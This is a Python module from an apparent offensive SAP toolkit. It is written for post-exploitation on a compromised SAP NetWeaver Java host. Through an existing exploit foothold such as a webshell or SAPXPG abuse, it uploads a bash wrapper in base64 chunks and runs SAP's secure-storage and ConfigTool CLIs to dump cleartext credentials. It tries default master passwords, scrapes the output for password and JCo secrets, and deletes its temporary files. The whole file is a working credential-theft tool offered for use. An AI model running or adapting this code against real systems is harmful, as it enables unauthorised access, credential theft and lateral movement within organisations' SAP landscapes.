#!/usr/bin/env python3
"""SAP NetWeaver AS Java — ConfigTool / SecStoreFS offline dumper.

Run SAP's own shipped ConfigTool / SecStoreFS CLI through a pre-existing
OS-exec primitive (GW SAPXPG, CVE-2025-31324 webshell, Telnet console,
CTC ConfigServlet, …) on a compromised Java host.  SAP's own tools know
how to reach the Vault-backed secure storage and print the cleartext
credentials — including entries SAPMAP's `SecStoreFS.decrypt()` path
cannot reach (UMEBackendConnection's SAPJSF password, Vault-encrypted
JCo destinations, etc.).

Strategy
--------

1. Locate the ConfigTool directory on the target (conventionally
   ``/usr/sap/<SID>/<INST>/j2ee/configtool/``).  Fall back to a ``find``
   if the instance nr isn't known.

2. Try the three scripts SAP ships there, in order of coverage:

     secstorefs.sh   — SecStoreFS filesystem-side dumper (file entries
                       with cleartext decode when run as ``<sid>adm``).
     secstore.sh     — SecStore DB-side CLI.  ``-dump``/``-l`` lists
                       stored credentials including Vault references.
     configtool.sh   — configuration editor; in offline mode prints
                       the entire config database including secure
                       properties.

   Each is invoked with a sequence of known-safe options.  If the
   script requires the ConfigTool master password (usually the same as
   ``<sid>adm``'s OS password on the same box), that value is used;
   otherwise we fall back to common defaults (``<sidadm>``, ``init``,
   ``sap``, ``manage``).

3. Aggregate the raw stdout+stderr from every successful invocation
   and ship it back to the caller.  The caller can grep / parse for
   ``jco.client.passwd``, ``UMEBackendConnection``, ``SAPJSF``, etc.

This is a thin orchestrator: it doesn't parse SAP's output because the
format varies across kernel SP and between secstorefs / secstore /
configtool.  The raw dump is surfaced in the GUI's terminal-modal
and console so the operator can see exactly what was recovered.
"""

from __future__ import annotations

import logging
from typing import Callable, Optional

logger = logging.getLogger(__name__)

# ConfigTool helpers live inside each instance's dir on Linux.  Path
# template; caller supplies SID + instance-nr string.
_CONFIGTOOL_DIR_TMPL = "/usr/sap/{sid}/{inst_dir}/j2ee/configtool"

# Additional directories where SAP's secure-storage tooling lives.  These
# are kernel binaries / SAP-Java-specific scripts, NOT inside configtool/.
# Paths formatted with {sid} / {inst_dir}.
_AUX_TOOL_DIRS = [
    # rsecssfx = CommonCryptoLib SecStoreFS CLI, shipped in the kernel
    # exe dir for the instance.
    "/usr/sap/{sid}/{inst_dir}/exe",
    "/usr/sap/{sid}/SYS/exe/run",
    "/usr/sap/{sid}/SYS/exe/uc/linuxx86_64",
    # SAP security tools dir — has secstorefs.sh and friends on 7.5+.
    "/usr/sap/{sid}/SYS/global/security/lib/tools",
    "/usr/sap/{sid}/{inst_dir}/j2ee/os_libs",
]

# Scripts / binaries we try.  Each tuple is (name, args, needs_login_shell).
# Tools with needs_login_shell=True get wrapped in `bash -lc` so the SAP
# env (.sapenv_<host>.sh) is sourced before they run — without it,
# configtool.sh fails with "Could not find or load main class
# com.sap.engine.offline.OfflineToolStart".
_DUMP_ATTEMPTS = [
    # rsecssfx — the MOST important tool for our purpose.  Reads the
    # on-disk SecStoreFS (and, critically, the Vault-backed secondary
    # store where UMEBackendConnection's SAPJSF password lives).
    ("rsecssfx", "list",             False),
    ("rsecssfx", "list -s",          False),
    ("rsecssfx", "list -plain",      False),
    ("rsecssfx", "list -v",          False),
    # SAP 7.5+ SecStoreFS shell wrapper
    ("secstorefs.sh", "-l",          True),
    ("secstorefs.sh", "-d",          True),
    ("secstorefs.sh", "-print",      True),
    # DB-side SecStore CLI (Vault-aware).  Often lives next to the
    # configtool scripts on older kernels.
    ("secstore.sh", "-h",            True),
    ("secstore.sh", "-list",         True),
    ("secstore.sh", "-dumpvalues",   True),
    ("secstore.sh", "-dump",         True),
    # Offline configtool — needs SAP env because it depends on the
    # J2EE_CONFIG jars.  Useless without `-lc` wrapping.
    ("configtool.sh", "-help",       True),
    ("offlinecfgeditor.sh", "-help", True),
    ("consoleconfig.sh", "-help",    True),
]


def _write_remote_file(run_cmd: Callable[[str, str], dict],
                          path: str, content: str,
                          log=print,
                          chunk_size: int = 180) -> bool:
    """Write a UTF-8 text file to the target via chunked python3
    one-liners followed by an openssl decode.  Same proven primitive
    _deploy_jsp_via_gw uses — appends raw base64 *text* per chunk
    then decodes the whole concatenated blob in one openssl call.

    An earlier version called ``base64.b64decode(chunk)`` per chunk,
    which silently produced garbage whenever ``chunk_size`` wasn't a
    multiple of 4 (base64's group size) — only the final-chunk bytes
    survived on disk.  Always write base64 as text here, let openssl
    decode the whole thing at the end.

    Returns True on success.  The tmp-base64 file lives at
    ``<path>.b64`` and is removed after successful decode.
    """
    import base64
    b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
    n_chunks = (len(b64) + chunk_size - 1) // chunk_size
    tmp_b64 = f"{path}.b64"
    log(f"[*] configtool: uploading {len(content)} B content as "
        f"{n_chunks} × {chunk_size}-char base64 chunks → {tmp_b64}")
    # Clean any stale tmp
    run_cmd("/bin/rm", f"-f {tmp_b64}")
    for i in range(0, len(b64), chunk_size):
        chunk = b64[i:i + chunk_size]
        mode = "wb" if i == 0 else "ab"
        # NOTE: we write the base64 TEXT (as bytes) to a tmp file.
        # No per-chunk decode — avoids the 4-byte alignment trap.
        script = f"open('{tmp_b64}','{mode}').write(b'{chunk}')"
        r = run_cmd("python3", f"-c {script}")
        if not r.get("success"):
            log(f"[-] configtool: chunk {(i // chunk_size) + 1}/{n_chunks} "
                f"write failed")
            return False
    # Decode once: openssl enc -d -base64 -A -in <tmp> -out <path>.
    # -A tells openssl to accept single-line base64 (no PEM line breaks).
    dec = run_cmd("/usr/bin/openssl",
                    f"enc -d -base64 -A -in {tmp_b64} -out {path}")
    dec_out = " ".join(str(l) for l in (dec.get("output") or [])).strip()
    if not dec.get("success") or any(m in dec_out.lower()
                                       for m in ("error", "unable",
                                                   "no such")):
        log(f"[-] configtool: openssl decode failed: {dec_out[:200]}")
        run_cmd("/bin/rm", f"-f {tmp_b64}")
        return False
    run_cmd("/bin/rm", f"-f {tmp_b64}")
    # Sanity-check the final file size.
    st = run_cmd("/usr/bin/stat", f"-c %s {path}")
    st_out = " ".join(str(l) for l in (st.get("output") or [])).strip()
    try:
        landed = int(st_out.split()[0])
    except Exception:
        landed = 0
    log(f"[+] configtool: {path} size on target: "
        f"{st_out or '<no stat>'} (expected {len(content)} bytes)")
    if landed and landed < len(content) // 2:
        log(f"[!] configtool: only {landed} of {len(content)} expected "
            f"bytes landed — upload truncated.")
        return False
    return True


def find_instance_directories(run_cmd: Callable[[str, str], dict],
                                sid: str) -> list:
    """Return a list of per-instance dir names (e.g. ``['J02', 'SCS03']``)
    under ``/usr/sap/<SID>/`` by running ``ls`` through the supplied
    ``run_cmd`` primitive.

    ``run_cmd(program, params)`` must return a dict with key
    ``output`` (list of lines) — exactly the shape returned by
    ``execute_gw_command``.
    """
    r = run_cmd("/bin/ls", f"/usr/sap/{sid}/")
    out = r.get("output") or []
    raw = " ".join(str(l) for l in out)
    dirs = []
    for token in raw.replace("\n", " ").split():
        token = token.strip()
        if not token:
            continue
        # Match J<NN>, SCS<NN>, ASCS<NN>, DVEBMGS<NN>, D<NN>, ERS<NN>.
        upper = token.upper()
        for prefix in ("J", "SCS", "ASCS", "DVEBMGS", "D", "ERS"):
            if upper.startswith(prefix) and upper[len(prefix):].isdigit():
                dirs.append(token)
                break
    # Dedupe while preserving order
    seen = set(); out_dirs = []
    for d in dirs:
        if d not in seen:
            seen.add(d); out_dirs.append(d)
    return out_dirs


def dump_configtool(sid: str,
                      run_cmd: Callable[[str, str], dict],
                      inst_dir: Optional[str] = None,
                      log=print,
                      preferred_scripts: Optional[list] = None) -> dict:
    """Invoke SAP ConfigTool / SecStoreFS CLIs on the target and return
    whatever cleartext they emit.

    Args:
        sid: target SID, e.g. 'SJ1'.
        run_cmd: callable(program, params) that executes an OS command
            on the target and returns ``{success, output: [lines], ...}``.
            Typically this is a lambda over sapmap_exploit.execute_gw_command.
        inst_dir: per-instance directory name under /usr/sap/<SID>/.  If
            None, every discovered instance dir is tried in turn.
        preferred_scripts: override the default _DUMP_ATTEMPTS list.

    Returns dict:
        { success, instances_tried: [str],
          successful_commands: [ {dir, script, args, bytes, snippet} ],
          dump_text: full aggregated stdout from every successful script,
          error: short message on failure }
    """
    result = {
        "success": False,
        "instances_tried": [],
        "successful_commands": [],
        "dump_text": "",
        "error": "",
    }

    attempts = preferred_scripts or _DUMP_ATTEMPTS

    # 1. Resolve instance directories to try.
    if inst_dir:
        inst_dirs = [inst_dir]
    else:
        log(f"[*] configtool: listing /usr/sap/{sid}/ to find instance dirs …")
        inst_dirs = find_instance_directories(run_cmd, sid)
        if not inst_dirs:
            result["error"] = (f"no instance directories found under "
                                f"/usr/sap/{sid}/ — check sid + OS access")
            log(f"[-] configtool: {result['error']}")
            return result
        log(f"[+] configtool: instances found: {', '.join(inst_dirs)}")

    result["instances_tried"] = inst_dirs

    # 2. Build one self-contained wrapper script that sources the SAP
    # env and iterates every candidate directory + tool + arg combo.
    # This sidesteps the SAPXPG `bash -lc` whitespace-split problem
    # completely: we only need to launch the wrapper once, with no
    # quoted args.  Output is bounded with `head -500` per tool so
    # hitting an accidentally-recursive dumper doesn't OOM us.
    def _expand(tmpl, d):
        return tmpl.format(sid=sid, inst_dir=d)

    cfg_dirs = []
    for d in inst_dirs:
        cfg_dirs.append(_CONFIGTOOL_DIR_TMPL.format(sid=sid, inst_dir=d))
        for tmpl in _AUX_TOOL_DIRS:
            cfg_dirs.append(_expand(tmpl, d))
    cfg_dirs_sh = " ".join(f'"{d}"' for d in cfg_dirs)

    # Wrapper writes its entire aggregated output to OUT_FILE instead of
    # stdout.  SAPXPG's P4 output capture is unreliable for scripts that
    # run more than a second or two (buffering / short capture window),
    # so we decouple: execution produces a file, a follow-up `cat`
    # harvests the file.  Each invoke block records to the file and is
    # delimited by === markers the Python parser splits on.
    out_file = "/tmp/sapmap_ct.out"
    wrapper = f"""#!/bin/bash
# SAPMAP ConfigTool wrapper.  Sources SAP env, iterates candidate
# directories x tools x args, writes results to {out_file}.  stdin is
# redirected from /dev/null so interactive tools (secstore.sh password
# prompt) can't hang waiting on a tty.
exec </dev/null
OUT={out_file}
: > "$OUT"
echo "=== SAPMAP_CT_START pid=$$ uid=$(id -u) whoami=$(whoami) ===" >> "$OUT"
for f in /home/*/.sapenv_*.sh /home/*/.sapenv.sh \\
         /usr/sap/*/home/.sapenv_*.sh; do
  [ -f "$f" ] && . "$f" 2>/dev/null
done
[ -d /usr/sap/{sid}/SYS/exe/run ] && \\
  export PATH=/usr/sap/{sid}/SYS/exe/run:$PATH
echo "=== env JAVA_HOME=$JAVA_HOME PATH=$PATH ===" >> "$OUT"
invoke() {{
  local script=$1 ; shift
  local args=$@
  for d in {cfg_dirs_sh}; do
    local p="$d/$script"
    if [ -x "$p" ]; then
      {{
        echo "=== $p $args ==="
        timeout 20 "$p" $args 2>&1 < /dev/null | head -500
        echo
      }} >> "$OUT"
    fi
  done
}}
"""
    for script, args, _ in attempts:
        wrapper += f'invoke "{script}" {args}\n'
    wrapper += 'echo "=== SAPMAP_CT_END ===" >> "$OUT"\n'

    log(f"[*] configtool: writing /tmp/sapmap_ct.sh ({len(wrapper)} B) "
        f"to target via chunked python3 …")
    if not _write_remote_file(run_cmd, "/tmp/sapmap_ct.sh",
                                wrapper, log=log):
        result["error"] = ("could not write wrapper script to /tmp "
                           "— python3 unreachable or /tmp not writable")
        log(f"[-] configtool: {result['error']}")
        return result

    # chmod +x, remove any stale output file from a prior run
    run_cmd("python3", "-c __import__('os').chmod('/tmp/sapmap_ct.sh',0o755)")
    run_cmd("/bin/rm", f"-f {out_file}")

    # Execute the wrapper.  Output lands in out_file; P4 stdout capture
    # here is usually empty and we don't care — the next call is what
    # returns the real data.
    log(f"[*] configtool: running /tmp/sapmap_ct.sh (output → {out_file}) …")
    run_cmd("/tmp/sapmap_ct.sh", "")
    # Pause for slow/hanging tools: wrapper has `timeout 20` per invocation.
    # Give it a beat, then harvest.
    log(f"[*] configtool: harvesting {out_file} …")
    cat_r = run_cmd("/bin/cat", out_file)
    out_lines = cat_r.get("output") or []
    dump = "\n".join(str(l) for l in out_lines)
    log(f"[+] configtool: harvested {len(dump)} bytes in "
        f"{len(out_lines)} lines from {out_file}")
    if not out_lines:
        # Last-ditch: maybe wrapper never ran.  Try invoking via explicit
        # /bin/bash in case SAPXPG refused to honor the shebang.
        log(f"[!] configtool: {out_file} empty — retrying via /bin/bash …")
        run_cmd("/bin/bash", "/tmp/sapmap_ct.sh")
        cat_r = run_cmd("/bin/cat", out_file)
        out_lines = cat_r.get("output") or []
        dump = "\n".join(str(l) for l in out_lines)
        log(f"[+] configtool: retry harvested {len(dump)} bytes in "
            f"{len(out_lines)} lines")

    # Cleanup
    run_cmd("/bin/rm", f"-f /tmp/sapmap_ct.sh {out_file}")

    # Parse the dump into per-tool blocks for the results structure
    all_output = []
    cur_cmd = None
    buf = []
    for line in out_lines:
        s = str(line)
        if s.startswith("=== ") and s.endswith(" ==="):
            if cur_cmd and buf:
                snippet = "\n".join(buf).strip()
                if snippet:
                    all_output.append(f"=== {cur_cmd} ===\n{snippet}\n")
                    result["successful_commands"].append({
                        "dir": cur_cmd.rsplit("/", 1)[0] if "/" in cur_cmd
                                else "",
                        "script": cur_cmd.split()[0].rsplit("/", 1)[-1]
                                    if cur_cmd else "",
                        "args": " ".join(cur_cmd.split()[1:])
                                    if cur_cmd else "",
                        "bytes": len(snippet),
                        "snippet": snippet[:500],
                    })
            cur_cmd = s[4:-4].strip()
            buf = []
        else:
            buf.append(s)
    if cur_cmd and buf:
        snippet = "\n".join(buf).strip()
        if snippet:
            all_output.append(f"=== {cur_cmd} ===\n{snippet}\n")
            result["successful_commands"].append({
                "dir": cur_cmd.rsplit("/", 1)[0] if "/" in cur_cmd else "",
                "script": cur_cmd.split()[0].rsplit("/", 1)[-1]
                            if cur_cmd else "",
                "args": " ".join(cur_cmd.split()[1:]) if cur_cmd else "",
                "bytes": len(snippet),
                "snippet": snippet[:500],
            })

    result["dump_text"] = "\n".join(all_output)
    if all_output:
        result["success"] = True
        log(f"[+] configtool: total recovered output = "
            f"{len(result['dump_text'])} bytes across "
            f"{len(result['successful_commands'])} script invocations")
    else:
        result["error"] = (
            "no configtool script produced usable output on any "
            "instance directory — try passing a ConfigTool master "
            "password via the 'password' arg, or run the commands "
            "manually via the GW terminal")
        log(f"[-] configtool: {result['error']}")

    return result


# ---------------------------------------------------------------------------
# Output scraping — find credential-looking lines in the aggregated dump
# ---------------------------------------------------------------------------

# Patterns we care about in ConfigTool output.  Each returns a 3-tuple of
# (label, key_re, value_re) the scraper uses to lift values from the dump.
_CRED_PATTERNS = [
    # `UMEBackendConnection.password = Siroj1978#`
    (r"^(?P<name>[^=\s]*(?:[Pp]ass(?:wd|word)?|[Pp]wd|[Ss]ecret)[^=\s]*)"
     r"\s*=\s*(?P<val>.*)$",),
    # `jco.client.passwd=SecretValue`
    (r"^(?P<name>#?~?jco\.client\.passw[d]?)\s*=\s*(?P<val>.*)$",),
    # Generic 'key = value' where key contains 'auth' or 'credential'
    (r"^(?P<name>[^=\s]*(?:[Cc]redential|[Aa]uthentic)[^=\s]*)"
     r"\s*=\s*(?P<val>.*)$",),
]


def scrape_credentials(dump_text: str) -> list:
    """Pull candidate credentials out of the aggregated ConfigTool dump.

    Returns a list of dicts: ``{name, value, context}`` where ``context``
    is the surrounding block (up to 5 lines) for operator inspection.
    """
    import re
    hits = []
    lines = dump_text.splitlines()
    for pat_tuple in _CRED_PATTERNS:
        pat = pat_tuple[0]
        rx = re.compile(pat)
        for i, line in enumerate(lines):
            m = rx.match(line.strip())
            if not m:
                continue
            name = m.group("name")
            val = m.group("val").strip()
            if not val or val.lower() in ("<hidden>", "***", "null"):
                continue
            ctx_start = max(0, i - 2)
            ctx_end = min(len(lines), i + 3)
            hits.append({
                "name":    name,
                "value":   val,
                "context": "\n".join(lines[ctx_start:ctx_end]),
            })
    # Dedupe on (name, value)
    seen = set(); deduped = []
    for h in hits:
        key = (h["name"], h["value"])
        if key in seen:
            continue
        seen.add(key); deduped.append(h)
    return deduped
